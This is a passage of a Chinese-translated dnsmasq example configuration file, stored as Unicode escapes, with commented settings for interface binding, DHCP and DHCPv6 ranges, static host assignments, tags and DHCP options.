\u5982\u4e0a\u6240\u793a\u914d\u7f6e\u5b83\uff0c\u7136\u540e\u4f7f\u7528\u4ee5\u4e0b\u884c\u6765 # \u7981\u7528\u5176\u4e0a\u7684DHCP\u548cTFTP\u3002 #no-dhcp-interface= # \u4ec5\u4e3a\u76f4\u63a5\u8fde\u63a5\u5230\u672c\u673a\u7684\u7f51\u7edc\u63d0\u4f9bDNS\u548cDHCP\u670d\u52a1\u3002 # \u4efb\u4f55interface=\u884c\u5c06\u8986\u76d6\u5b83\u3002 #local-service # \u5728\u652f\u6301\u7684\u7cfb\u7edf\u4e0a\uff0cdnsmasq\u7ed1\u5b9a\u901a\u914d\u5730\u5740\uff0c # \u5373\u4f7f\u5b83\u53ea\u76d1\u542c\u67d0\u4e9b\u63a5\u53e3\u3002\u7136\u540e\u5b83\u4e22\u5f03 # \u4e0d\u5e94\u7b54\u590d\u7684\u8bf7\u6c42\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f # \u5373\u4f7f\u63a5\u53e3\u6765\u6765\u53bb\u53bb\u4e14\u66f4\u6539\u5730\u5740\u4e5f\u80fd\u5de5\u4f5c\u3002\u5982\u679c\u4f60 # \u5e0c\u671bdnsmasq\u771f\u6b63\u53ea\u7ed1\u5b9a\u5b83\u6b63\u5728\u76d1\u542c\u7684\u63a5\u53e3\uff0c # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e2a\u9009\u9879\u3002\u5927\u7ea6\u552f\u4e00\u9700\u8981\u8fd9\u4e2a\u7684\u65f6\u5019\u662f\u5f53 # \u540c\u4e00\u53f0\u673a\u5668\u4e0a\u8fd0\u884c\u53e6\u4e00\u4e2a\u540d\u79f0\u670d\u52a1\u5668\u3002 # # \u8981\u53ea\u5728localhost\u4e0a\u76d1\u542c\u5e76\u4e0d\u63a5\u6536\u5176\u4ed6 # \u63a5\u53e3\u7684\u6570\u636e\u5305\uff0c\u8bf7\u4ec5\u7ed1\u5b9a\u5230lo\u8bbe\u5907\u3002\u6ce8\u91ca\u6389\u4ee5\u5728\u5355\u4e2a # \u901a\u914d\u7b26\u5957\u63a5\u5b57\u4e0a\u7ed1\u5b9a\u3002 bind-interfaces # \u5982\u679c\u4f60\u4e0d\u5e0c\u671bdnsmasq\u8bfb\u53d6/etc/hosts\uff0c\u53d6\u6d88\u6ce8\u91ca # \u4e0b\u9762\u8fd9\u884c\u3002 #no-hosts # \u6216\u8005\u5982\u679c\u4f60\u5e0c\u671b\u5b83\u8bfb\u53d6\u53e6\u4e00\u4e2a\u6587\u4ef6\u4ee5\u53ca/etc/hosts\uff0c\u4f7f\u7528 # \u8fd9\u4e2a\u3002 #addn-hosts=/etc/banner_add_hosts # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u81ea\u52a8\u5c06\u57df\u6dfb\u52a0\u5230hosts-file\u4e2d\u7684\u7b80\u5355\u540d\u79f0\u4e2d\uff0c # \u8bbe\u7f6e\u6b64\u9879\uff08\u548cdomain: \u89c1\u4e0b\u6587\uff09\u3002 #expand-hosts # \u4e3adnsmasq\u8bbe\u7f6e\u57df\u3002\u8fd9\u662f\u53ef\u9009\u7684\uff0c\u4f46\u5982\u679c\u8bbe\u7f6e\uff0c # \u5b83\u5c06\u505a\u4ee5\u4e0b\u51e0\u4ef6\u4e8b\u60c5\u3002 # 1) \u5141\u8bb8DHCP\u4e3b\u673a\u62e5\u6709\u5b8c\u5168\u5408\u683c\u7684\u57df\u540d\uff0c\u53ea\u8981\u57df\u90e8\u5206\u4e0e\u6b64\u8bbe\u7f6e\u5339\u914d\u3002 # 2) \u8bbe\u7f6e\u201c\u57df\u201dDHCP\u9009\u9879\uff0c\u4ece\u7eed\u800c\u6f5c\u5728\u5730\u8bbe\u7f6e\u6240\u6709\u901a\u8fc7DHCP\u914d\u7f6e\u7684\u7cfb\u7edf\u7684\u57df # 3) \u4e3a\u201cexpand-hosts\u201d\u63d0\u4f9b\u57df\u90e8\u5206 #domain=thekelleys.org.uk # \u4e3a\u7279\u5b9a\u5b50\u7f51\u8bbe\u7f6e\u4e0d\u540c\u7684\u57df #domain=wireless.thekelleys.org.uk,192.168.2.0/24 # \u540c\u6837\u7684\u6982\u5ff5\uff0c\u4f46\u4f7f\u7528\u8303\u56f4\u800c\u4e0d\u662f\u5b50\u7f51 #domain=reserved.thekelleys.org.uk,192.68.3.100,192.168.3.200 # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e2a\u4ee5\u542f\u7528\u96c6\u6210\u7684DHCP\u670d\u52a1\u5668\uff0c\u4f60\u9700\u8981 # \u63d0\u4f9b\u53ef\u4f9b\u79df\u8d41\u7684\u5730\u5740\u8303\u56f4\uff0c\u4ee5\u53ca\u53ef\u9009\u7684 # \u79df\u8d41\u65f6\u95f4\u3002\u5982\u679c\u4f60\u6709\u591a\u4e2a\u7f51\u7edc\uff0c\u4f60\u5c06\u9700\u8981 # \u4e3a\u6bcf\u4e2a\u7f51\u7edc\u91cd\u590d\u8fd9\u4e00\u8bbe\u7f6e\u4ee5\u63d0\u4f9bDHCP\u670d\u52a1\u3002 #dhcp-range=192.168.0.50,192.168.0.150,12h # \u8fd9\u662f\u4e00\u4e2aDHCP\u8303\u56f4\u7684\u793a\u4f8b\uff0c\u5176\u4e2d\u7ed9\u51fa\u4e86\u5b50\u7f51\u63a9\u7801\u3002\u8fd9\u662f # \u9700\u8981\u901a\u8fc7\u4e2d\u7ee7\u4ee3\u7406\u5230\u8fbednsmasq DHCP\u670d\u52a1\u5668\u7684\u7f51\u7edc\u6240\u9700\u7684\u3002 # \u5982\u679c\u4f60\u4e0d\u77e5\u9053DHCP\u4e2d\u7ee7\u4ee3\u7406\u662f\u4ec0\u4e48\uff0c\u4f60\u53ef\u80fd # \u4e0d\u9700\u8981\u62c5\u5fc3\u8fd9\u4e2a\u3002 #dhcp-range=192.168.0.50,192.168.0.150,255.255.255.0,12h # \u8fd9\u662f\u4e00\u4e2a\u8bbe\u7f6e\u4e86\u6807\u7b7e\u7684DHCP\u8303\u56f4\u7684\u793a\u4f8b\uff0c # \u56e0\u6b64\u67d0\u4e9bDHCP\u9009\u9879\u53ef\u80fd\u53ea\u4e3a\u8fd9\u4e2a\u7f51\u7edc\u8bbe\u7f6e\u3002 #dhcp-range=set:red,192.168.0.50,192.168.0.150 # \u5f53\u6807\u7b7e\"green\"\u88ab\u8bbe\u7f6e\u65f6\uff0c\u4f7f\u7528\u8fd9\u4e2aDHCP\u8303\u56f4\u3002 #dhcp-range=tag:green,192.168.0.50,192.168.0.150,12h # \u6307\u5b9a\u4e00\u4e2a\u5b50\u7f51\u4e0d\u80fd\u7528\u4e8e\u52a8\u6001\u5730\u5740\u5206\u914d\uff0c # \u4ec5\u4e3a\u4e0e--dhcp-host\u884c\u5339\u914d\u7684\u4e3b\u673a\u53ef\u7528\u3002\u6ce8\u610f # \u9664\u975e\u6709\u67d0\u79cd\u7c7b\u578b\u7684dhcp-range\u4e3a\u8be5\u5b50\u7f51\uff0c # \u5426\u5219dhcp-host\u58f0\u660e\u5c06\u88ab\u5ffd\u7565\u3002 # \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5b50\u7f51\u63a9\u7801\u662f\u9690\u542b\u7684\uff08\u5b83\u6765\u81ea # \u8fd0\u884cdnsmasq\u7684\u673a\u5668\u4e0a\u7684\u7f51\u7edc\u914d\u7f6e\uff09\uff0c\u53ef\u4ee5\u6307\u5b9a # \u4e00\u4e2a\u660e\u786e\u7684\u5b50\u7f51\u63a9\u7801\u3002 #dhcp-range=192.168.0.0,static # \u542f\u7528DHCPv6\u3002\u6ce8\u610f\u4e0d\u9700\u8981\u6307\u5b9a\u524d\u7f00\u957f\u5ea6 # \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5982\u679c\u7f3a\u5931\u5219\u4e3a64\u3002 #dhcp-range=1234::2, 1234::500, 64, 12h # \u8fdb\u884c\u8def\u7531\u901a\u544a\uff0c\u4f46\u4e0d\u4e3a\u8fd9\u4e2a\u5b50\u7f51\u505aDHCP\u3002 #dhcp-range=1234::, ra-only # \u8fdb\u884c\u8def\u7531\u901a\u544a\uff0c\u4f46\u4e0d\u4e3a\u8fd9\u4e2a\u5b50\u7f51\u505aDHCP\uff0c\u540c\u65f6\u5c1d\u8bd5 # \u4e3aSLAAC\u914d\u7f6e\u7684\u53cc\u6808\u4e3b\u673a\u7684IPv6\u5730\u5740\u6dfb\u52a0\u540d\u79f0\u3002 # \u4f7f\u7528DHCPv4\u79df\u7ea6\u6765\u63a8\u5bfc\u540d\u79f0\uff0c\u7f51\u7edc\u6bb5\u548c # MAC\u5730\u5740\uff0c\u5e76\u5047\u8bbe\u8be5\u4e3b\u673a\u4e5f\u4f1a\u6709\u4e00\u4e2a # \u4f7f\u7528SLAAC\u7b97\u6cd5\u8ba1\u7b97\u7684IPv6\u5730\u5740\u3002 #dhcp-range=1234::, ra-names # \u8fdb\u884c\u8def\u7531\u901a\u544a\uff0c\u4f46\u4e0d\u4e3a\u8fd9\u4e2a\u5b50\u7f51\u505aDHCP\u3002 # \u8bbe\u7f6e\u751f\u547d\u5468\u671f\u4e3a46\u5c0f\u65f6\u3002\uff08\u6ce8\u610f\uff1a\u6700\u5c0f\u751f\u547d\u5468\u671f\u4e3a2\u5c0f\u65f6\u3002\uff09 #dhcp-range=1234::, ra-only, 48h # \u4e3a\u8fd9\u4e2a\u5b50\u7f51\u505aDHCP\u548c\u8def\u7531\u901a\u544a\u3002\u5728RA\u4e2d\u8bbe\u7f6eA\u4f4d\uff0c # \u8fd9\u6837\u5ba2\u6237\u7aef\u53ef\u4ee5\u4f7f\u7528SLAAC\u5730\u5740\u548cDHCP\u5730\u5740\u3002 #dhcp-range=1234::2, 1234::500, slaac # \u8fdb\u884c\u8def\u7531\u901a\u544a\u548c\u65e0\u72b6\u6001DHCP\u4e3a\u8fd9\u4e2a\u5b50\u7f51\u3002\u5ba2\u6237\u7aef\u4e0d\u4f1a # \u4eceDHCP\u83b7\u5f97\u5730\u5740\uff0c\u4f46\u5b83\u4eec\u4f1a\u83b7\u5f97\u5176\u4ed6\u914d\u7f6e\u4fe1\u606f\u3002 # \u5b83\u4eec\u5c06\u4f7f\u7528SLAAC\u6765\u83b7\u5f97\u5730\u5740\u3002 #dhcp-range=1234::, ra-stateless # \u8fdb\u884c\u65e0\u72b6\u6001DHCP\u3001SLAAC\uff0c\u5e76\u4eceDHCPv4\u79df\u7ea6\u751f\u6210 # SLAAC\u5730\u5740\u7684DNS\u540d\u79f0\u3002 #dhcp-range=1234::, ra-stateless # ra-names # \u5bf9\u4e8e\u6240\u6709\u8fdb\u884cDHCPv6\u7684\u5b50\u7f51\u505a\u8def\u7531\u901a\u544a # \u9664\u975e\u88abra-stateless, ra-names\u7b49\u8986\u76d6\uff0c\u8def\u7531\u901a\u544a\u4f1a # \u8bbe\u7f6eM\u548cO\u4f4d\uff0c\u4f7f\u5f97\u5ba2\u6237\u7aef\u4eceDHCPv6\u83b7\u53d6\u5730\u5740\u548c\u914d\u7f6e\uff0c # \u5e76\u91cd\u7f6eA\u4f4d\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u4e0d\u4f7f\u7528SLAAC\u5730\u5740\u3002 #enable-ra # \u4f7f\u7528DHCP\u4e3a\u6307\u5b9a\u4e3b\u673a\u63d0\u4f9b\u53c2\u6570\u3002\u6709\u5f88\u591a # \u6709\u6548\u7684\u66ff\u4ee3\u65b9\u6848\uff0c\u56e0\u6b64\u6211\u4eec\u5c06\u7ed9\u51fa\u6bcf\u4e2a\u7684\u793a\u4f8b\u3002\u6ce8\u610f # IP\u5730\u5740\u4e0d\u5fc5\u5728\u4e0a\u9762\u7ed9\u51fa\u7684\u8303\u56f4\u5185\uff0c\u5b83\u4eec\u53ea\u9700\u8981 # \u5728\u540c\u4e00\u7f51\u7edc\u4e0a\u3002\u8fd9\u4e9b\u53c2\u6570\u7684\u987a\u5e8f\u65e0\u5173\u7d27\u8981\uff0c\u53ef\u4ee5\u4efb\u610f # \u987a\u5e8f\u7ed9\u51fa\u540d\u79f0\u3001\u5730\u5740\u548cMAC\u3002 # \u59cb\u7ec8\u4e3a\u5177\u6709\u4ee5\u592a\u7f51\u5730\u5740 11:22:33:44:55:66 \u7684\u4e3b\u673a\u5206\u914d # IP\u5730\u5740 192.168.0.60 #dhcp-host=11:22:33:44:55:66,192.168.0.60 # \u59cb\u7ec8\u5c06\u786c\u4ef6\u5730\u5740\u4e3a 11:22:33:44:55:66 \u7684\u4e3b\u673a\u7684\u540d\u79f0 # \u8bbe\u7f6e\u4e3a \"fred\" #dhcp-host=11:22:33:44:55:66,fred # \u59cb\u7ec8\u7ed9\u4ee5\u592a\u7f51\u5730\u5740\u4e3a 11:22:33:44:55:66 \u7684\u4e3b\u673a # \u540d\u79f0fred\u548cIP\u5730\u5740192.168.0.60\uff0c\u5e76\u4e14\u79df\u7ea6\u65f6\u95f4\u4e3a45\u5206\u949f #dhcp-host=11:22:33:44:55:66,fred,192.168.0.60,45m # \u7ed9\u5177\u6709\u4ee5\u592a\u7f51\u5730\u5740 11:22:33:44:55:66 \u6216 # 12:34:56:78:90:12 \u7684\u4e3b\u673a IP \u5730\u5740 192.168.0.60\u3002 # Dnsmasq \u4f1a\u5047\u8bbe\u8fd9\u4e24\u4e2a\u4ee5\u592a\u7f51\u63a5\u53e3\u4e0d\u4f1a\u540c\u65f6\u4f7f\u7528\uff0c # \u5e76\u5373\u4f7f\u7b2c\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u8be5 IP \u5730\u5740\u4e5f\u4f1a\u7ed9\u7b2c\u4e8c\u4e2a\u5206\u914d IP \u5730\u5740\u3002 # \u5bf9\u4e8e\u5177\u6709\u6709\u7ebf\u548c\u65e0\u7ebf\u5730\u5740\u7684\u7b14\u8bb0\u672c\u7535\u8111\u5f88\u6709\u7528\u3002 #dhcp-host=11:22:33:44:55:66,12:34:56:78:90:12,192.168.0.60 # \u7ed9\u58f0\u79f0\u5176\u540d\u79f0\u4e3a \"bert\" \u7684\u673a\u5668 IP \u5730\u5740 # 192.168.0.70 \u548c\u4e00\u4e2a\u65e0\u9650\u671f\u79df\u7ea6 #dhcp-host=bert,192.168.0.70,infinite # \u59cb\u7ec8\u7ed9\u5177\u6709\u5ba2\u6237\u7aef\u6807\u8bc6\u7b26 01:02:02:04 \u7684\u4e3b\u673a # IP\u5730\u5740 192.168.0.60 #dhcp-host=id:01:02:02:04,192.168.0.60 # \u59cb\u7ec8\u7ed9\u5177\u6709 InfiniBand \u786c\u4ef6\u5730\u5740 # 80:00:00:48:fe:80:00:00:00:00:00:00:f4:52:14:03:00:28:05:81 \u7684 # ip\u5730\u5740 192.168.0.61\u3002\u5ba2\u6237\u7aefID\u6765\u6e90\u4e8e\u524d\u7f00 # ff:00:00:00:00:00:02:00:00:02:c9:00 \u548c\u786c\u4ef6\u5730\u5740\u7684\u6700\u540e8\u5bf9 # \u5341\u516d\u8fdb\u5236\u6570\u5b57\u3002 #dhcp-host=id:ff:00:00:00:00:00:02:00:00:02:c9:00:f4:52:14:03:00:28:05:81,192.168.0.61 # \u59cb\u7ec8\u7ed9\u5ba2\u6237\u7aef\u6807\u8bc6\u7b26\u4e3a \"marjorie\" \u7684\u4e3b\u673a # IP\u5730\u5740 192.168.0.60 #dhcp-host=id:marjorie,192.168.0.60 # \u542f\u7528\u201cjudge\u201d\u5728/etc/hosts\u4e2d\u7684\u5730\u5740 # \u7ed9\u5448\u73b0\u540d\u79f0\u201cjudge\u201d\u7684\u673a\u5668\uff0c\u5f53 # \u5b83\u8bf7\u6c42\u4e00\u4e2aDHCP\u79df\u7ea6\u3002 #dhcp-host=judge # \u6c38\u4e0d\u5411\u4ee5\u592a\u7f51 # \u5730\u5740\u4e3a 11:22:33:44:55:66 \u7684\u673a\u5668\u63d0\u4f9bDHCP\u670d\u52a1 #dhcp-host=11:22:33:44:55:66,ignore # \u5ffd\u7565\u5177\u6709\u4ee5\u592a\u7f51\u5730\u5740 11:22:33:44:55:66 \u7684\u673a\u5668\u63d0\u4f9b\u7684\u4efb\u4f55\u5ba2\u6237\u7aefID\u3002 # \u8fd9\u6709\u52a9\u4e8e\u5728\u673a\u5668\u5728\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u8fd0\u884c\u6216 # \u5728PXE\u5f15\u5bfc\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5bfc\u4e4b\u95f4\u9632\u6b62\u673a\u5668\u88ab\u4e0d\u540c\u5bf9\u5f85\u3002 #dhcp-host=11:22:33:44:55:66,id:* # \u5411\u8bbe\u7f6e\u4e86\"red\"\u6807\u7b7e\u7684\u4e3b\u673a\u53d1\u9001\u989d\u5916\u7684\u9009\u9879\uff0c # \u5176\u4ee5\u592a\u7f51\u5730\u5740\u4e3a 11:22:33:44:55:66 #dhcp-host=11:22:33:44:55:66,set:red # \u5411\u4efb\u4f55\u4ee5\u592a\u7f51\u5730\u5740\u5f00\u59cb\u4e3a11:22:33:\u7684\u673a\u5668\u53d1\u9001\u989d\u5916\u7684\u9009\u9879\uff0c # \u8bbe\u7f6e\u4e86\"red\"\u6807\u7b7e #dhcp-host=11:22:33:*:*:*,set:red # \u7ed9\u5177\u6709DUID 00:01:00:01:16:d2:83:fc:92:d4:19:e2:d8:b2\u7684\u5ba2\u6237\u7aef # \u56fa\u5b9aIPv6\u5730\u5740\u548c\u540d\u79f0\uff0c\u6ce8\u610fMAC\u5730\u5740\u4e0d\u80fd\u7528\u4e8e\u8bc6\u522bDHCPv6\u5ba2\u6237\u7aef\u3002 # \u8fd8\u8981\u6ce8\u610f\u5fc5\u987b\u5728IPv6\u5730\u5740\u5468\u56f4\u4f7f\u7528[]\u3002 #dhcp-host=id:00:01:00:01:16:d2:83:fc:92:d4:19:e2:d8:b2, fred, [1234::5] # \u5ffd\u7565\u4efb\u4f55\u672a\u5728dhcp-host\u884c\u4e2d\u6307\u5b9a\u6216/etc/ethers\u4e2d\u7684\u5ba2\u6237\u7aef\u3002 # \u76f8\u5f53\u4e8eISC\u7684\"deny unknown-clients\"\u3002 # \u8fd9\u4f9d\u8d56\u4e8e\u7279\u6b8a\u7684\"known\"\u6807\u7b7e\uff0c\u5f53 # \u5339\u914d\u4e3b\u673a\u65f6\u4f1a\u8bbe\u7f6e\u3002 #dhcp-ignore=tag:!known # \u5411\u5305\u542b\u5b50\u5b57\u7b26\u4e32\"Linux\"\u7684DHCP vendorclass\u5b57\u7b26\u4e32\u7684\u4efb\u4f55\u673a\u5668\u53d1\u9001\u989d\u5916\u7684\u9009\u9879 #dhcp-vendorclass=set:red,Linux # \u5411\u5176\u4e2d\u4e00\u4e2aDHCP userclass\u5b57\u7b26\u4e32\u5305\u542b\u5b50\u5b57\u7b26\u4e32\"accounts\"\u7684\u4efb\u4f55\u673a\u5668\u53d1\u9001\u989d\u5916\u7684\u9009\u9879 #dhcp-userclass=set:red,accounts # \u5411MAC\u5730\u5740\u7b26\u5408\u6a21\u5f0f\u7684\u4efb\u4f55\u673a\u5668\u53d1\u9001\u989d\u5916\u7684\u9009\u9879\u3002 #dhcp-mac=set:red,00:60:8C:*:*:* # \u5982\u679c\u53d6\u6d88\u6ce8\u91ca\u6b64\u884c\uff0cdnsmasq\u5c06\u8bfb\u53d6/etc/ethers\u5e76\u6267\u884c # \u4ee5\u592a\u7f51\u5730\u5740/IP\u5bf9\uff0c\u5c31\u50cf\u5b83\u4eec\u5df2\u7ecf # \u4f5c\u4e3a--dhcp-host\u9009\u9879\u7ed9\u51fa\u4e00\u6837\u3002\u5982\u679c\u4f60\u4fdd\u6301 # MAC\u5730\u5740/\u4e3b\u673a\u6620\u5c04\u5728\u90a3\u91cc\u51fa\u4e8e\u5176\u4ed6\u76ee\u7684\u6709\u7528\u3002 #read-ethers # \u5411\u8bf7\u6c42DHCP\u79df\u7ea6\u7684\u4e3b\u673a\u53d1\u9001\u9009\u9879\u3002 # \u8be6\u89c1RFC 2132\u4e86\u89e3\u53ef\u7528\u9009\u9879\u3002 # \u5e38\u89c1\u9009\u9879\u53ef\u4ee5\u901a\u8fc7\u540d\u79f0\u7ed9dnsmasq\uff1a # \u8fd0\u884c \"dnsmasq --help dhcp\" \u83b7\u5f97\u5217\u8868\u3002 # \u6ce8\u610f\u6240\u6709\u5e38\u89c1\u8bbe\u7f6e\uff0c\u5982\u7f51\u7edc\u63a9\u7801\u548c # \u5e7f\u64ad\u5730\u5740\u3001DNS\u670d\u52a1\u5668\u548c\u9ed8\u8ba4\u8def\u7531\uff0c\u90fd\u88abdnsmasq\u8d4b\u4e88 # \u5408\u7406\u7684\u9ed8\u8ba4\u503c\u3002\u4f60\u5f88\u53ef\u80fd\u4e0d\u9700\u8981 # \u4efb\u4f55dhcp-options\u3002\u5982\u679c\u4f60\u4f7f\u7528Windows\u5ba2\u6237\u7aef\u548cSamba\uff0c\u6709\u4e00\u4e9b # \u63a8\u8350\u7684\u9009\u9879\uff0c\u5b83\u4eec\u8be6\u7ec6\u8bf4\u660e\u5728\u672c\u8282\u7684 # \u672b\u5c3e\u3002 # \u8986\u76d6dnsmasq\u63d0\u4f9b\u7684\u9ed8\u8ba4\u8def\u7531\uff0c\u8be5\u9ed8\u8ba4\u8def\u7531\u5047\u8bbe\u8def\u7531\u5668 # \u662f\u8fd0\u884cdnsmasq\u7684\u540c\u4e00\u53f0\u673a\u5668\u3002 #dhcp-option=3,1.2.3.4 # \u505a\u540c\u6837\u7684\u4e8b\u60c5\uff0c\u4f46\u4f7f\u7528\u9009\u9879\u540d\u79f0 #dhcp-option=option:router,1.2.3.4 # \u8986\u76d6dnsmasq\u63d0\u4f9b\u7684\u9ed8\u8ba4\u8def\u7531\u5e76\u6839\u672c\u4e0d\u53d1\u9001\u9ed8\u8ba4\u8def\u7531\u3002 # \u6ce8\u610f\u8fd9\u4ec5\u9002\u7528\u4e8e\u9ed8\u8ba4\u53d1\u9001\u7684\u9009\u9879\uff081, 3, 6, 12, 28\uff09 # \u76f8\u540c\u884c\u5c06\u4e3a\u6240\u6709\u5176\u4ed6\u9009\u9879\u7f16\u53f7\u53d1\u9001\u96f6\u957f\u5ea6\u9009\u9879\u3002 #dhcp-option=3 # \u5c06NTP\u65f6\u95f4\u670d\u52a1\u5668\u5730\u5740\u8bbe\u7f6e\u4e3a192.168.0.4\u548c10.10.0.5 #dhcp-option=option:ntp-server,192.168.0.4,10.10.0.5 # \u53d1\u9001DHCPv6\u9009\u9879\u3002\u6ce8\u610fIPv6\u5730\u5740\u5468# \u56f4\u9700\u8981\u7528[]\u62ec\u8d77\u6765\u3002 #dhcp-option=option6:dns-server,[1234::77],[1234::88] # \u5c06\u4f5c\u4e3a\u673a\u5668\u8fd0\u884cdnsmasq\u7684\u673a\u5668\u548c\u53e6\u4e00\u53f0\u673a\u5668\u7684\u540d\u79f0\u670d\u52a1\u5668\u53d1\u9001DHCPv6\u9009\u9879\u3002 #dhcp-option=option6:dns-server,[::],[1234::88] # \u8981\u6c42\u5ba2\u6237\u7aef\u6bcf\u516d\u5c0f\u65f6\u8f6e\u8be2\u4e00\u6b21\u9009\u9879\u53d8\u66f4\u3002\uff08RFC4242\uff09 #dhcp-option=option6:information-refresh-time,6h # \u8bbe\u7f6e\u9009\u987958\u5ba2\u6237\u7aef\u7eed\u79df\u65f6\u95f4\uff08T1\uff09\u3002\u9ed8\u8ba4\u4e3a\u79df\u7ea6\u65f6\u95f4\u7684\u4e00\u534a\uff0c\u5982\u679c\u672a\u6307\u5b9a\u3002\uff08RFC2132\uff09 #dhcp-option=option:T1,1m # \u8bbe\u7f6e\u9009\u987959\u91cd\u65b0\u7ed1\u5b9a\u65f6\u95f4\uff08T2\uff09\u3002\u9ed8\u8ba4\u4e3a\u79df\u7ea6\u65f6\u95f4\u76847/8\uff0c\u5982\u679c\u672a\u6307\u5b9a\u3002\uff08RFC2132\uff09 #dhcp-option=option:T2,2m # \u5c06NTP\u65f6\u95f4\u670d\u52a1\u5668\u5730\u5740\u8bbe\u7f6e\u4e3a\u8fd0\u884cdnsmasq\u7684\u540c\u4e00\u53f0\u673a\u5668 #dhcp-option=42,0.0.0.0 # \u5c06NIS\u57df\u540d\u8bbe\u7f6e\u4e3a\"welly\" #dhcp-option=40,welly # \u5c06\u9ed8\u8ba4\u751f\u5b58\u65f6\u95f4\u8bbe\u7f6e\u4e3a50 #dhcp-option=23,50 # \u8bbe\u7f6e\u201c\u6240\u6709\u5b50\u7f51\u90fd\u662f\u672c\u5730\u201d\u7684\u6807\u5fd7 #dhcp-option=27,1 # \u53d1\u9001etherboot\u9b54\u672f\u6807\u5fd7\u7136\u540e\u662fetherboot\u9009\u9879\uff08\u5b57\u7b26\u4e32\uff09\u3002 #dhcp-option=128,e4:45:74:68:00:00 #dhcp-option=129,NIC=eepro100 # \u6307\u5b9a\u4ec5\u5f53\u8bbe\u7f6e\u4e86\"red\"\u6807\u7b7e\u65f6\u53d1\u9001\u7684\u9009\u9879\uff0c # \uff08\u89c1dhcp-range\u7528\u4e8e\u58f0\u660e\"red\"\u7f51\u7edc\uff09 # \u6ce8\u610f\u6807\u7b7e\u90e8\u5206\u5fc5\u987b\u5728\u9009\u9879\u90e8\u5206\u4e4b\u524d\u3002 #dhcp-option = tag:red, option:ntp-server, 192.168.1.1 # \u4e0b\u9762\u7684DHCP\u9009\u9879\u8bbe\u7f6ednsmasq\u4e0e\u4e3a # ISC dhcpcd\u6307\u5b9a\u7684\u65b9\u5f0f\u76f8\u540c\uff0c\u5728 # http://www.samba.org/samba/ftp/docs/textdocs/DHCP-Server-Configuration.txt # \u4e3a\u5178\u578b\u7684dnsmasq\u5b89\u88c5\u9002\u5e94\uff0c\u5176\u4e2d\u8fd0\u884cdnsmasq\u7684\u4e3b\u673a\u4e5f\u662f\u8fd0\u884csamba\u7684\u4e3b\u673a\u3002 # \u5982\u679c\u4f60\u4f7f\u7528Windows\u5ba2\u6237\u7aef\u548cSamba\uff0c\u4f60\u53ef\u80fd\u5e0c\u671b\u53d6\u6d88\u6ce8\u91ca\u4e00\u4e9b\u6216\u5168\u90e8\u8fd9\u4e9b\u9009\u9879\u3002 #dhcp-option=19,0 # \u5173\u95edip-forwarding #dhcp-option=44,0.0.0.0 # \u8bbe\u7f6eNetBIOS over TCP/IP\u540d\u79f0\u670d\u52a1\u5668\uff08\u5373WINS\u670d\u52a1\u5668\uff09 #dhcp-option=45,0.0.0.0 # netbios\u6570\u636e\u62a5\u5206\u53d1\u670d\u52a1\u5668 #dhcp-option=46,8 # netbios\u8282\u70b9\u7c7b\u578b # \u53d1\u9001\u7a7a\u7684WPAD\u9009\u9879\u3002\u8fd9\u53ef\u80fd\u662f\u5fc5\u9700\u7684\u4ee5\u4f7fWindows 7\u8868\u73b0\u6b63\u5e38\u3002 #dhcp-option=252,\"\\n\" # \u53d1\u9001RFC-3397 DNS\u57df\u641c\u7d22DHCP\u9009\u9879\u3002\u8b66\u544a\uff1a\u4f60\u7684DHCP\u5ba2\u6237\u7aef # \u53ef\u80fd\u4e0d\u652f\u6301\u8fd9\u4e2a...... #dhcp-option=option:domain-search,eng.apple.com,marketing.apple.com # \u53d1\u9001RFC-3442\u65e0\u7c7b\u9759\u6001\u8def\u7531\uff08\u6ce8\u610f\u7f51\u7edc\u63a9\u7801\u7f16\u7801\uff09 #dhcp-option=121,192.168.1.0/24,1.2.3.4,10.0.0.0/8,5.6.7.8 # \u5728DHCP\u9009\u987943\u4e2d\u53d1\u9001\u5c01\u88c5\u7684vendor-class\u7279\u5b9a\u9009\u9879\u3002 # \u9009\u9879\u7684\u542b\u4e49\u7531vendor-class\u5b9a\u4e49 # \u56e0\u6b64\u9009\u9879\u4ec5\u5728\u5ba2\u6237\u7aef\u63d0\u4f9b\u7684vendor class # \u5339\u914d\u6b64\u5904\u7ed9\u51fa\u7684\u7c7b\u65f6\u53d1\u9001\u3002\uff08\u5b50\u5b57\u7b26\u4e32\u5339\u914d\u4e5f\u53ef\u4ee5\uff0c\u6240\u4ee5\"MSFT\" # \u5339\u914d\"MSFT\"\u548c\"MSFT 5.0\"\uff09\u3002\u6b64\u793a\u4f8b\u4e3aPXEClient\u8bbe\u7f6e # mtftp\u5730\u5740\u4e3a0.0.0.0\u3002 #dhcp-option=vendor:PXEClient,1,0.0.0.0 # \u53d1\u9001microsoft\u7279\u5b9a\u9009\u9879\u4ee5\u544a\u8bc9windows\u5728\u5b83\u5173\u95ed\u65f6\u91ca\u653eDHCP\u79df\u7ea6\u3002 # \u6ce8\u610f'i'\u6807\u5fd7\uff0c\u544a\u8bc9dnsmasq\u4ee5\u56db\u5b57\u8282\u6574\u6570\u53d1\u9001\u503c - \u8fd9\u662fmicrosoft\u6240\u9700\u7684\u3002 # \u53c2\u89c1 # http://technet2.microsoft.com/WindowsServer/en/library/a70f1bb7-d2d4-# 49f0-96d6-4b7414ecfaae1033.mspx?mfr=true #dhcp-option=vendor:MSFT,2,1i # \u53d1\u9001Etherboot\u9700\u8981\u7684\u5c01\u88c5vendor-class ID\uff0c # \u4ee5\u4f7f\u5176\u80fd\u8bc6\u522bDHCP\u670d\u52a1\u5668\u3002 #dhcp-option=vendor:Etherboot,60,\"Etherboot\" # \u5411PXELinux\u53d1\u9001\u9009\u9879\u3002\u6ce8\u610f\u5373\u4f7f\u5b83\u4eec\u6ca1\u6709\u51fa\u73b0\u5728\u53c2\u6570\u8bf7\u6c42\u5217\u8868\u4e2d\uff0c # 